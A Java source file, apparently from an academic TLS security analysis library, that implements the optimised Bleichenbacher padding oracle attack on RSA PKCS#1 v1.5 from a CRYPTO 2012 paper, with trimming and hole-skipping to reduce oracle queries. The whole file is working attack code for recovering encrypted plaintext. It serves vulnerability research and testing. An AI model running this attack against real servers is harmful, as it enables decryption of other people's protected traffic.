package de.rub.nds.ssl.analyzer.attacker;

import de.rub.nds.ssl.analyzer.attacker.bleichenbacher.Interval;
import de.rub.nds.ssl.analyzer.attacker.bleichenbacher.OracleException;
import de.rub.nds.ssl.analyzer.attacker.bleichenbacher.oracles.AOracle;
import de.rub.nds.ssl.stack.Utility;
import java.math.BigInteger;
import java.util.ArrayList;
import java.util.LinkedList;
import java.util.List;

/**
 * This program performs optimised [Bleichenbacher98] attack on PKCS#1 v1.5. as
 * described in Bardou, Focardi, Kawamoto, Simionato, Steel, Tsay "Efficient
 * Padding Oracle Attacks on Cryptographic Hardware" Published at CRYPTO 2012 It
 * supports trimming the interval, skipping holes, parallel threads method and
 * more
 *
 * @author Yusuke Kawamoto
 * @author Graham Steel Copyright INRIA, Released under CECILL-C license Full
 * license text at http://www.cecill.info/licences/Licence_CeCILL-C_V1-en.txt
 * @author Juraj Somorovsky (just adapted for our library)
 * @version 2012-01-21
 */
public class BleichenbacherCrypto12 extends Bleichenbacher {

    // Flags for padding oracles (TTT, TFT, FTT, FFT, FFF, JSSE are supported)
    /**
     * Allow nonterminated padding (no zero byte)
     */
    private boolean noterm;
    /**
     * Allow short padding (zero byte in the first 8)
     */
    private boolean shortpad;
    /**
     * Using Trimming
     */
    public final static Boolean USE_STEP1b_ROUND = true;
    /**
     * Using interval length
     */
    public final static Boolean USE_INTERVAL_LENGTH = false;
    // Flags for skipping-holes method
    // these parameters are very important for the performance of the 1b method
    /**
     * Number of trimming fractions to use
     */
    int numTrimmers;
    /**
     * number of trimmers default
     */
    public final static int NUM_TRIMMERS = 1500;
    /**
     * Max of (num + den) for width first search
     */
    public final static int MAX_ALL_FRACTION_SEARCH = 40;
    /**
     * Max of den for depth first search
     */
    public final static int MAX_FEW_FRACTION_SEARCH = 400;
    /**
     * Maximum of denominators after taking lcm
     */
    public final static int MAX_DENOS = 5000;
    // Statistic (counter)
    static long counter_frac = 0;
    static int maxdenominator = 1;
    static long lcm_real = 1;
    // BigInteger
    final static BigInteger two = new BigInteger("2");
    final static BigInteger three = new BigInteger("3");
    final static BigInteger _256 = new BigInteger("256");
    protected BigInteger _2B = bigB.multiply(two);
    protected BigInteger _3B = bigB.multiply(three);

    /**
     * Default constructor with oracle initialization
     *
     * @param msg
     * @param pkcsOracle
     * @param msgPKCSconform
     * @param numTrimmers
     */
    public BleichenbacherCrypto12(final byte[] msg, AOracle pkcsOracle,
            final boolean msgPKCSconform, int numTrimmers) {
        super(msg, pkcsOracle, msgPKCSconform);
        this.numTrimmers = numTrimmers;
        this.initOracle();
    }

    /**
     * Default constructor with oracle initialization with default trimmers
     * number
     *
     * @param msg
     * @param pkcsOracle
     * @param msgPKCSconform
     */
    public BleichenbacherCrypto12(final byte[] msg, AOracle pkcsOracle,
            final boolean msgPKCSconform) {
        super(msg, pkcsOracle, msgPKCSconform);
        this.numTrimmers = NUM_TRIMMERS;
        this.initOracle();
    }

    /**
     * Initialize parameters noterm and shortpad according to the oracle type
     */
    private void initOracle() {
        switch (oracle.getOracleType()) {
            case TTT:
                noterm = true;
                shortpad = true;
                break;
            case TFT:
                noterm = true;
                shortpad = false;
                break;
            case FFT:
            case FFF:
            case JSSE:
                noterm = false;
                shortpad = false;
                break;
            default:
                noterm = false;
                shortpad = true;
        }
    }

    @Override
    protected void stepOneB() throws OracleException {
        byte[] send;
        logger.info("Starting step 1b: Trimming");

        // Compute n/(9B)
        int _n_div_9B = publicKey.getModulus().divide(bigB.multiply(new BigInteger("9"))).intValue();

        /* Note: plaintextLength will not be used below
         if USE_INTERVAL_LENGTH = false */
        BigInteger _E0 = def_E(_2B, blockSize);
        BigInteger _F0m1 = def_F(_2B, blockSize);

        m = new Interval[]{new Interval(_E0, _F0m1)};

        // Step 1b: Trimming phase //
        // Apply skipping-holes method to M_0
        // Initialize fractions for lower and upper bounds
        BigInteger lcm_dens_real;
        BigInteger[] FracLower = {BigInteger.ONE, BigInteger.ONE};
        BigInteger[] FracUpper = {BigInteger.ONE, BigInteger.ONE};
        // List of denominators that divide the plaintext
        List<BigInteger> dens = new LinkedList<BigInteger>();

        // List of trimmers that have been used
        List<BigInteger[]> usedTrimmers = new LinkedList<BigInteger[]>();

        // Generate (initial) trimmers for lower bound
        List<BigInteger[]> trimmersLower = getFractionLower(_E0, _F0m1, _n_div_9B);

        // Search for denominators (for lower bound)
        for (BigInteger[] fi : trimmersLower) {
            BigInteger num = fi[0];
            BigInteger den = fi[1];
            // Skip using den if we know den divides the plaintext
            if (dens.contains(den)) {
                continue;
            }

            send = prepareMsg(c0, num, den);
            if (oracle.checkPKCSConformity(send)) {
                logger.debug("   Aha! A valid padding with "
                        + num.intValue() + "/" + den.intValue());
                // Collect den that divides the plaintext
                dens.add(den);

                // Compute the currently best fraction for lower bound
                BigInteger[] newFracLower = updateFrac(FracLower, num, den);
                FracLower = newFracLower;
            }
            counter_frac++;
            // Collect the used trimmer fi
            usedTrimmers.add(fi);
        }
        logger.debug(" Fraction for lower bound: "
                + FracLower[0] + "/" + FracLower[1]);

        // Generate (initial) trimmers for upper bound
        List<BigInteger[]> trimmersUpper = getFractionUpper(trimmersLower);

        // Search for denominators (for upper bound)
        for (BigInteger[] fi : trimmersUpper) {
            BigInteger num = fi[0];
            BigInteger den = fi[1];
            // Skip using den if we know den divides the plaintext
            if (dens.contains(den)) {
                continue;
            }
            send = prepareMsg(c0, num, den);
            if (oracle.checkPKCSConformity(send)) {
                logger.debug("   Aha! A valid padding with "
                        + num.intValue() + "/" + den.intValue());
                // Collect den that divides the plaintext
                dens.add(den);

                // Compute the currently best fraction for upper bound
                BigInteger[] newFracUpper = updateFrac(FracUpper, num, den);
                FracUpper = newFracUpper;
            }
            counter_frac++;
            // Collect the used trimmer fi
            usedTrimmers.add(fi);
        }
        logger.debug(" Fraction for upper bound: "
                + FracUpper[0] + "/" + FracUpper[1]);

        // Compute the lcm of denominators
        logger.debug(" Computing the lcm of denominators...");
        lcm_real = lcm(dens, Integer.MAX_VALUE);
        logger.debug("   lcm_real = " + lcm_real);
        lcm_dens_real = BigInteger.valueOf(lcm_real);
        BigInteger lcm_dens = getDenominator(dens, MAX_DENOS);
        maxdenominator = lcm_dens.intValue();
        logger.debug("   lcm_dens = " + lcm_dens);

        // Compute the minimum/maximum numerators for the lcm of denominators
        if (lcm_dens.compareTo(BigInteger.ONE) > 0) { // if denominator >= 2 found

            // Generate candidates for the minimum numerator
            logger.debug(" Start to find minimum numerator:");
            List<BigInteger> NumLower = getNumeratorL(lcm_dens, _E0, _F0m1);
            logger.debug("   (from " + NumLower.get(0)
                    + "/" + lcm_dens
                    + " to " + NumLower.get(NumLower.size() - 1)
                    + "/" + lcm_dens + ")");

            // Obtain the order of searching numerators
            //int[] searchIndexL = getSearchIndex(NumLower.size());
            int[] searchIndexL = getClassicSearchIndex(NumLower.size());

            // Obtain the minimum numerator for the lcm of denominators
            int indexMax = NumLower.size() - 1;
            double FracLowerVal = FracLower[0].doubleValue()
                    / FracLower[1].doubleValue();
            for (int index : searchIndexL) {
                BigInteger num = NumLower.get(index);
                BigInteger[] ni = {num, lcm_dens};
                // Check if ni is already used to multply with the ciphertext
                Boolean IsUsedTrimmer = pairContainedIn(ni, usedTrimmers);
                double niVal = ni[0].doubleValue() / ni[1].doubleValue();

                // numerators for lower bound
                if (niVal < FracLowerVal && index < indexMax && !IsUsedTrimmer) {
                    send = prepareMsg(c0, num, lcm_dens);
                    //System.out.println(" [" + num + ", " + lcm_dens + "]");
                    counter_frac++;
                    if (oracle.checkPKCSConformity(send)) {
                        logger.debug("   Aha! A valid padding with "
                                + num.intValue() + "/"
                                + lcm_dens.intValue());
                        BigInteger[] newFracLower = updateFrac(FracLower, ni[0], ni[1]);
                        FracLower = newFracLower;
                        indexMax = index;
                    }
                }
            }

            // Generate candidates for the maximum numerator
            logger.debug(" Start to find maximum numerator:");
            List<BigInteger> NumUpper = getNumeratorU(lcm_dens, _E0, _F0m1);
            logger.debug("   (from " + NumUpper.get(0)
                    + "/" + lcm_dens
                    + " to " + NumUpper.get(NumUpper.size() - 1)
                    + "/" + lcm_dens + ")");

            // Obtain the order of searching numerators
            //int[] searchIndexU = getSearchIndex(NumUpper.size());
            int[] searchIndexU = getClassicSearchIndex(NumUpper.size());

            // Obtain the maximum numerator for the lcm of denominators
            indexMax = NumUpper.size() - 1;
            double FracUpperVal = FracUpper[0].doubleValue()
                    / FracUpper[1].doubleValue();
            for (int index : searchIndexU) {
                BigInteger num = NumUpper.get(index);
                BigInteger[] ni = {num, lcm_dens};
                // Check if ni is already used to multply with the ciphertext
                Boolean IsUsedTrimmer = pairContainedIn(ni, usedTrimmers);
                double niVal = ni[0].doubleValue() / ni[1].doubleValue();

                // numerators for upper bound
                if (niVal > FracUpperVal && index < indexMax && !IsUsedTrimmer) {
                    send = prepareMsg(c0, num, lcm_dens);
                    //System.out.println(" [" + num + ", " + lcm_dens + "]");
                    counter_frac++;
                    if (oracle.checkPKCSConformity(send)) {
                        logger.debug("   Aha! A valid padding with "
                                + num.intValue() + "/"
                                + lcm_dens.intValue());
                        BigInteger[] newFracUpper = updateFrac(FracUpper, ni[0], ni[1]);
                        FracUpper = newFracUpper;
                        indexMax = index;
                    }
                }
            }

        }

        // Print the obtained fractions for lower and upper bounds
        logger.debug(" Fraction for lower bound: "
                + FracLower[0] + "/" + FracLower[1]);
        logger.debug(" Fraction for upper bound: "
                + FracUpper[0] + "/" + FracUpper[1]);
        logger.debug(" counter_frac: " + counter_frac);

        // Update the initial interval by using the obtained fractions
        BigInteger[] new_m = updateM(m[0].lower, m[0].upper, FracLower, FracUpper, _E0, _F0m1, lcm_dens_real);

        m = new Interval[]{new Interval(new_m[0], new_m[1])};

//        System.out.println("Used queries: " + oracle.getNumberOfQueries());
    }

    @Override
    protected void stepTwoA() throws OracleException {
        byte[] send;
        boolean pkcsConform = false;
        BigInteger n = publicKey.getModulus();

        logger.info("Step 2a: Starting the search");
        // si = ceil((n+2B)/upper)
        BigInteger tmp[] = (n.add(_2B)).divideAndRemainder(m[0].upper);
        if (BigInteger.ZERO.compareTo(tmp[1]) != 0) {
            si = tmp[0].add(BigInteger.ONE);
        } else {
            si = tmp[0];
        }

        // correction will be done in do while
        si = si.subtract(BigInteger.ONE);

        int j = 0;
        do {
            j++;
            BigInteger min = divideCeil((_2B.add(n.multiply(BigInteger.valueOf(j)))), m[0].upper);
            BigInteger max = (_3B.add(n.multiply(BigInteger.valueOf(j)))).divide(m[0].lower);
            si = min;
            boolean skipHole = false;
            do {
                si = si.add(BigInteger.ONE);
                if (si.compareTo(max) > 0) {
                    skipHole = true;
                } else {
                    send = prepareMsg(c0, si);
                    // check PKCS#1 conformity
                    pkcsConform = oracle.checkPKCSConformity(send);
                }
            } while (!skipHole && !pkcsConform);
        } while (!pkcsConform);
    }

    //////////// Methods for attacks (bounds) ////////////
    /**
     * This method returns _E that is a tighter lower bound and replaces _2B.
     *
     * @param _2B 2B.
     * @param plaintextLength The length of (fake) plaintext.
     * @return The lower bound of the (fake) plaintext.
     */
    public BigInteger def_E(BigInteger _2B, int plaintextLength) {
        if (shortpad) {
            return _2B;
        } else if (USE_INTERVAL_LENGTH) {
            BigInteger _E = _2B;
            if (plaintextLength >= 0) {
                for (int j = blockSize - 3; j > plaintextLength; j--) {
                    _E = _E.add(new BigInteger("256").pow(j));
                }
            }
            return _E;
        } else {
            BigInteger _E = _2B;
            for (int j = blockSize - 3; j > blockSize - 11; j--) {
                _E = _E.add(new BigInteger("256").pow(j));
            }
            return _E;
        }
    }

    /**
     * This method returns _F that is a tighter lower bound and replaces _3B.
     *
     * @param _2B 2B.
     * @param plaintextLength The length of (fake) plaintext.
     * @return The upper bound of the (fake) plaintext.
     */
    public BigInteger def_F(BigInteger _2B, int plaintextLength) {
        if (noterm) {
            return _2B.multiply(three).divide(two).subtract(BigInteger.ONE);
        } else if (USE_INTERVAL_LENGTH) {
            BigInteger _F = _2B;
            if (plaintextLength >= 0) {
                for (int j = blockSize - 3; j > plaintextLength; j--) {
                    _F = _F.add(new BigInteger("255").multiply(new BigInteger("256").pow(j)));
                }
                for (int j = plaintextLength - 1; j >= 0; j--) {
                    _F = _F.add(new BigInteger("255").multiply(new BigInteger("256").pow(j)));
                }
            }
            return _F;
        } else {
            BigInteger _F = _2B;
            if (plaintextLength >= 0) {
                for (int j = blockSize - 3; j > 0; j--) {
                    _F = _F.add(new BigInteger("255").multiply(new BigInteger("256").pow(j)));
                }
            }
            return _F;
        }
    }

    //////////// Methods for attacks (fractions) ////////////
    /**
     * This method checks if a fraction trim is contained in a list trimmers.
     *
     * @param trim Fraction called a trimmer.
     * @param trimmers List of fractions (called trimmers).
     * @return True if trim is contained in trimmers and false otherwise.
     */
    public Boolean pairContainedIn(BigInteger[] trim, List<BigInteger[]> trimmers) {
        Boolean containedIn = false;
        if (trim.length >= 2) {
            for (BigInteger[] ti : trimmers) {
                if (trim[0].compareTo(ti[0]) == 0
                        && trim[1].compareTo(ti[1]) == 0) {
                    containedIn = true;
                } else if (trim[1].remainder(ti[1]).compareTo(BigInteger.ZERO) == 0) {
                    BigInteger num = ti[0].multiply(trim[1].divide(ti[1]));
                    if (num.compareTo(trim[0]) == 0) {
                        containedIn = true;
                    }
                }
            }
        }
        return containedIn;
    }

    /**
     * This method generate (initial) trimmers for lower bound.
     *
     * @param _E0 The initial lower bound of plaintext (of unknown length).
     * @param _F0m1 The initial upper bound of plaintext (of unknown length).
     * @param _n_div_9B n / (9B)
     * @return List of trimmers for lower bound.
     */
    public List<BigInteger[]> getFractionLower(BigInteger _E0, BigInteger _F0m1, int _n_div_9B) {
        List<BigInteger[]> trimmers = new ArrayList<BigInteger[]>();
        int j = 2;
        // Width search
      /* Smaller denominators divide ciphertexts more often,
         so we first check all small fractions.            */
        for (int k = 5; k <= Math.max(MAX_ALL_FRACTION_SEARCH, 5); k++) {
            for (int i = 2; i < k - 1; i++) {
                j = k - i;
                BigInteger bi = BigInteger.valueOf(i);
                BigInteger bj = BigInteger.valueOf(j);
                if (j != 1 && i < j && j < _n_div_9B
                        && bi.multiply(_F0m1).compareTo(bj.multiply(_E0)) > 0
                        && bi.gcd(bj).intValue() == 1) {
                    BigInteger[] trim = {bi, bj};
                    trimmers.add(trim);
                    //System.out.println(" Add [i = " + i + ", j = " + j + "]");
                }
            }
        }

        // Depth search
      /* Larger denominators divide ciphertexts less often,
         so we check only fractions that are close to 1,
         which will make the result of division between
         [E, F] more often than fractions far from 1. */
        int k = 1;
        do {
            for (j = Math.max(MAX_ALL_FRACTION_SEARCH, 5) / 2 + 1;
                    j <= MAX_FEW_FRACTION_SEARCH; j++) {
                int i = j - k;
                while (i != 1 && i < j
                        && BigInteger.valueOf(i).multiply(_F0m1).compareTo(BigInteger.valueOf(j).multiply(_E0)) > 0) {
                    BigInteger bi = BigInteger.valueOf(i);
                    BigInteger bj = BigInteger.valueOf(j);
                    BigInteger[] trim = {bi, bj};
                    // Check if trim is in trimmers
                    Boolean containedIn = pairContainedIn(trim, trimmers);
                    // Add trim if trim is in trimmers and if ...
                    if (!containedIn && bi.gcd(bj).intValue() == 1) {
                        trimmers.add(trim);
                        //System.out.println(" Add [i = " + i + ", j = " + j + "]");
                        break;
                    }
                    i--;
                    if (trimmers.size() >= numTrimmers / 2) {
                        break;
                    }
                }
                if (trimmers.size() >= numTrimmers / 2) {
                    break;
                }
            }
            k++;
        } while (trimmers.size() < numTrimmers / 2);
        logger.debug("   loop num: " + k);
        logger.debug("   length of trimmers: " + trimmers.size() + " last j: " + j);
        return trimmers;
    }

    /**
     * This method generate (initial) trimmers for upper bound. If num/den is a
     * trimmer for lower bound, then den/num is added to list of trimmers for
     * upper bound.
     *
     * @param trimmersLower List of trimmers for lower bound.
     * @return List of trimmers for upper bound.
     */
    public List<BigInteger[]> getFractionUpper(List<BigInteger[]> trimmersLower) {
        List<BigInteger[]> trimmersUpper = new ArrayList<BigInteger[]>();
        for (BigInteger[] ti : trimmersLower) {
            BigInteger[] trim = {ti[1], ti[0]};
            trimmersUpper.add(trim);
            //System.out.println(" Add [i = " + trim[0] + ", j = " + trim[1] + "]");
        }
        return trimmersUpper;
    }

    /**
     * This method calculates the largest denominator (lcm or less than
     * MAX_DENOS).
     *
     * @param dens List of denominators.
     * @param MAX_DENOS Maximum of denominators.
     * @return The largest denominator.
     */
    public BigInteger getDenominator(List<BigInteger> dens, long maxDenos) {
        long den = 1;
        if (!dens.isEmpty()) {
            //System.out.println(" lcm(real): " + lcm(dens, Integer.MAX_VALUE));
            den = maxDivisor(lcm(dens, Integer.MAX_VALUE), maxDenos);
        }
        return BigInteger.valueOf(den);
    }

    /**
     * This method obtains the order of searching numerators (searching all).
     *
     * @param size The size of search index array.
     * @return Array of indexes for just searching from the beginning.
     */
    public int[] getClassicSearchIndex(int size) {
        int[] searchIndex = new int[size];
        for (int index = 0; index < size; index++) {
            searchIndex[index] = index;
        }
        return searchIndex;
    }

    /**
     * This method obtains candidates of numerators (for lower bound).
     *
     * @param lcm_dens The lcm of denominators.
     * @param _E0 The initial lower bound of possible plaintexts.
     * @param _F0m1 The initial upper bound of possible plaintexts.
     * @return List of numerator candidates for lower bound.
     */
    public List<BigInteger> getNumeratorL(BigInteger lcm_dens, BigInteger _E0, BigInteger _F0m1) {
        List<BigInteger> trimmers_num = new ArrayList<BigInteger>();
        if (lcm_dens.compareTo(BigInteger.ONE) > 0) {
            // lcm of dens
            final long den = lcm_dens.longValue();

            // Minimum of candidates of numerators
            // (den / iMin)  <= (_F0m1 / _E0) = 3/2
            final long iMin = BigInteger.valueOf(den).multiply(_E0).divide(_F0m1).intValue();

            // Collect i such that iMin <= i < den(denominator)
            for (long i = iMin; i < den; i++) {
                //System.out.println(" Add [i = " + i + ", den = " + den + "]");
                trimmers_num.add(BigInteger.valueOf(i));
            }
            //System.out.println("   length of trimmers: "+trimmers_num.size() + " last i: " + i);
        }
        return trimmers_num;
    }

    /**
     * This method obtains candidates of numerators (for upper bound).
     *
     * @param lcm_dens
     * @param _E0 The initial lower bound of possible plaintexts.
     * @param _F0m1 The initial upper bound of possible plaintexts.
     * @return List of numerator candidates for upper bound.
     */
    public List<BigInteger> getNumeratorU(BigInteger lcm_dens, BigInteger _E0, BigInteger _F0m1) {
        List<BigInteger> trimmers_num = new ArrayList<BigInteger>();
        if (lcm_dens.compareTo(BigInteger.ONE) > 0) {
            // lcm of dens
            final long den = lcm_dens.longValue();

            // Maximum of candidates of numerators
            // (den / iMax)  >= (_E0 / _F0m1) = 2/3
            final long iMax = BigInteger.valueOf(den).multiply(_F0m1).divide(_E0).intValue();

            // Collect i such that den(denominator) < i <= iMax
            for (long i = iMax; i > den; i--) {
                //System.out.println(" Add [i = " + i + ", den = " + den + "]");
                trimmers_num.add(BigInteger.valueOf(i));
            }
            //System.out.println("   length of trimmers: "+trimmers_num.size() + " last i: " + i);
        }
        return trimmers_num;
    }

    /**
     * This method computes maximum and minumum fractions
     *
     * @param Frac Currently maximum/minumum fraction.
     * @param num New numerator to be compared.
     * @param den New denominator to be compared.
     * @return New maximum/minumum fraction.
     */
    public BigInteger[] updateFrac(BigInteger[] Frac, BigInteger num, BigInteger den) {
        BigInteger newF[] = {Frac[0], Frac[1]};
        try {
            if (Frac[0].compareTo(BigInteger.ONE) == 0
                    || Frac[1].compareTo(BigInteger.ONE) == 0) {
                newF[0] = num;
                newF[1] = den;
                return newF;
            } else {
                double oldFracVal = Frac[0].doubleValue() / Frac[1].doubleValue();
                double newFracVal = num.doubleValue() / den.doubleValue();

                if (newFracVal > 1) { // Adjust upper bound:
                    if (newFracVal > oldFracVal) { // if this new bound is better, use it 
                        newF[0] = num;
                        newF[1] = den;
                    }
                } else { // Adjust lower bound:
                    if (newFracVal < oldFracVal) {
                        newF[0] = num;
                        newF[1] = den;
                    }
                }
            }
        } catch (Exception e) {
            System.out.println(" uppdateFrac: " + e);
        }
        return newF;
    }

//////////// Methods for attacks (skipped holes) ////////////
    /**
     * This method updates the current interval of possible plaintexts by using
     * fractions.
     *
     * @param M0 Initial interval of possible plaintexts.
     * @param FracLower Fraction for lower bound.
     * @param FracUpper Fraction for upper bound.
     * @param _E0 The initial lower bound of possible plaintexts.
     * @param _F0m1 The initial upper bound of possible plaintexts.
     * @param lcm_dens The lcm of denominators.
     * @return Updated interval of possible plaintexts.
     */
    public BigInteger[] updateM(BigInteger M0_lower, BigInteger M0_upper, BigInteger FracLower[], BigInteger FracUpper[], BigInteger _E0, BigInteger _F0m1, BigInteger lcm_dens_real) {
        BigInteger newM0[] = {M0_lower, M0_upper};
        try {
            // Adjust upper bound:
            BigInteger num = FracUpper[0];
            BigInteger den = FracUpper[1];
            BigInteger newUpper = divideCeil(M0_upper.multiply(den), num);
            if (USE_STEP1b_ROUND) {
                newUpper = newUpper.divide(lcm_dens_real).multiply(lcm_dens_real);
            }

            // If this new bound (newUpper) is better, use it.
            if (M0_upper.compareTo(newUpper) > 0) {
                newM0[1] = newUpper;
            }

            // Adjust lower bound:
            num = FracLower[0];
            den = FracLower[1];
            BigInteger newLower = M0_lower.multiply(den).divide(num); //floor
            if (USE_STEP1b_ROUND) {
                newLower = divideCeil(newLower, lcm_dens_real).multiply(lcm_dens_real);
            }

            // If this new bound (newLower) is better, use it.
            if (M0_lower.compareTo(newLower) < 0) {
                newM0[0] = newLower;
            }
        } catch (Exception e) {
            System.out.println(" uppdateM: " + e);
        }

        return newM0;
    }

    //////////// Methods for arithmetics ////////////
    /**
     * This method return the quotient (round up).
     *
     * @param ne BigInteger.
     * @param si Divisor.
     * @return The ceiling of division of ne by si.
     */
    public BigInteger divideCeil(BigInteger ne, BigInteger si) {
        BigInteger[] DaR = ne.divideAndRemainder(si);
        if (DaR[1].equals(BigInteger.ZERO)) {
            return DaR[0];
            // return ne.divide(si);
        } else {
            return DaR[0].add(BigInteger.ONE);
            // return ne.divide(si).add(BigInteger.ONE);
        }
    }

    /**
     * This method calculates gcd of two integers.
     *
     * @param a Integer.
     * @param b Integer.
     * @return GCD of a and b.
     */
    public int gcd(int a, int b) {
        if (b == 0) {
            return a;
        } else {
            return gcd(b, a % b);
        }
    }

    /**
     * This method calculates the lcm of BigIntegers dens or the largest divisor
     * of lcm that is less than MAX_DENOS.
     *
     * @param dens List of denominators.
     * @param MAX_DENOS Maximum of divisors.
     * @return The lcm of dens or the largest divisor of lcm that is less than
     * MAX_DENOS.
     */
    public long lcm(List<BigInteger> dens, long maxDenos) {
        if (!dens.isEmpty()) {
            long j = dens.get(0).longValue();
            for (int i = 1; i < dens.size(); i++) {
                long jtmp = j * (dens.get(i).longValue())
                        / (BigInteger.valueOf(j).gcd(dens.get(i)).longValue());
                if (jtmp > maxDenos || jtmp < j) {
                    return j; // Overflow of jtmp
                }
                j = jtmp;
            }
            return j;
        } else {
            return 1;
        }
    }

    /**
     * This method calculates the biggest divisor that is less than MAX_DENOS.
     *
     * @param lcm The lcm of denominators.
     * @param MAX_DENOS Maximum of divisors.
     * @return Largest divisor.
     */
    public long maxDivisor(long lcm, long maxDenos) {
        long d;
        if (lcm <= maxDenos) {
            return lcm;
        } else {
            for (d = Math.min(lcm / 2, maxDenos); d > 1; d--) {
                if (lcm % d == 0 && d <= maxDenos) {
                    break;
                }
            }
            return d;
        }
    }

    /**
     * Prepares message for sending it to the oracle it computes
     * m*si/denominator if we use a plaintext validation oracle. Otherwise, it
     * computes c*si^e*denominator^(-e) mod n
     *
     * @param originalMessage original message to be changed
     * @param si factor
     * @param denominator denominator
     * @return
     */
    protected byte[] prepareMsg(final BigInteger originalMessage,
            final BigInteger si, final BigInteger denominator) {
        byte[] msg;
        BigInteger tmp;

        // if we use a real oracle (not a plaintext oracle), the si value has
        // to be encrypted first.
        if (!oracle.isPlaintextOracle()) {
            // encrypt: c*si^e*denominator^(-e) mod n
            tmp = originalMessage.multiply(si.modPow(publicKey.getPublicExponent(),
                    publicKey.getModulus())).multiply(denominator.modPow(
                    publicKey.getPublicExponent().negate(),
                    publicKey.getModulus())).mod(publicKey.getModulus());
        } else {
            // encrypt: m*si/denominator mod n
            BigInteger[] val;
            val = originalMessage.multiply(si).divideAndRemainder(denominator);
            if (val[1].equals(BigInteger.ZERO)) {
                tmp = val[0].mod(publicKey.getModulus());
            } else {
                // we cannot divide, thus we set the temp value to some
                // invalid message, e.g. 4B
                tmp = _2B.multiply(_2B);
            }

        }

        // get bytes
        msg = Utility.correctSize(tmp.toByteArray(), blockSize, true);

        return msg;
    }
}
